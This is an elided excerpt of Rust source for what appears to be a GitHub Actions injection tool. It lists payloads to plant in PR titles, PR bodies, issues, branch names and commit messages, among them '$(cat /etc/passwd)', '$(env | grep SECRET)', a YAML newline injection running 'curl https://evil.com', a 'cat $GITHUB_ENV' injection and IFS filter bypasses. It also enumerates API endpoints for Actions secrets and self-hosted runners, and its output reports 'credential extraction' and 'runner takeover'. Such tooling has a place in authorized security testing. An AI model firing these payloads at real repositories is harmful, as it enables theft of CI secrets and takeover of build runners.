...
const GHA_INJECTION_VECTORS: &[(&str, &str, &str)] = &[
    (
        "PR title — command substitution",
        "$(whoami)",
        "pull_request",
    ),
    ("PR title — backticks", "`whoami`", "pull_request"),
    (
        "PR body — command substitution",
        "$(cat /etc/passwd)",
        "pull_request",
    ),
    ...
    (
        "Issue title — command substitution",
        "$(env | grep SECRET)",
        "issues",
    ),
    (
        "Issue body — env exfil",
    ...
    (
        "Issue body — ${{ }} strategy context",
        "${{ strategy.job-index }}",
        "issues",
    ),
    (
        "PR title — newline injection",
        "test\n  - run: curl https://evil.com",
        "pull_request",
    ),
    (
        "PR body — YAML injection",
        "test\n  - run: cat $GITHUB_ENV",
        "pull_request",
    ),
    ("Branch name — semgrep bypass", "$(echo${IFS}evil)", "push"),
    (
        "Commit message — IFS bypass",
        "test${IFS}&&${IFS}whoami",
        "push",
    ),
    (
        "PR title — base64 exec",
...
const WORKFLOW_ENDPOINTS: &[(&str, &str)] = &[
    ...
    (
        "Self-hosted runners",
        "/repos/{repo}/actions/runners?labels=self-hosted",
    ),
    (
        "Environment secrets",
        "/repos/{repo}/environments/{env}/secrets",
    ),
...
pub async fn inject(repo: &str, token: Option<&str>, timeout: u64) -> anyhow::Result<()> {
    ...
    println!(
        "\n{} [1/2] GitHub Actions API enumeration...",
        "[*]".cyan().bold()
    );
    ...
    for (name, path) in WORKFLOW_ENDPOINTS {
        let url = format!(
            ...
            path.replace("{repo}", repo)
                .replace("{org}", &repo.split('/').next().unwrap_or(repo))
        );
        match client
            .get(&url)
            ...
            Ok(resp) => {
                ...
                let tag = if accessible {
                    if has_secrets {
                        ...
                        "WORKFLOWS".green().bold().to_string()
                    } else {
    ...
    let has_secrets = found
        .iter()
        .any(|n| n.contains("secret") || n.contains("Secret"));
    let has_runners = found
        .iter()
        .any(|n| n.contains("runner") || n.contains("Runner"));
    if has_secrets {
        println!(
            "{} [CRITICAL] Actions secrets accessible — credential extraction possible!",
            "[!]".red().bold()
        );
    }
    if has_runners {
        println!(
            "{} [HIGH] Self-hosted runners detected — runner takeover possible!",
            "[!]".red().bold()
        );
    }
    if !results.is_empty() {
        ...
        if has_expr {
            println!(
                "{} [CRITICAL] ${{{{}}}} expression injection — secret exfiltration via PR/issue!",
                "[!]".red().bold()
            );
        }
        if has_cmd {
        ...
        if has_yaml {
            println!(
                "{} [HIGH] YAML injection — workflow file modification!",
                "[!]".red().bold()
            );
        }
    }
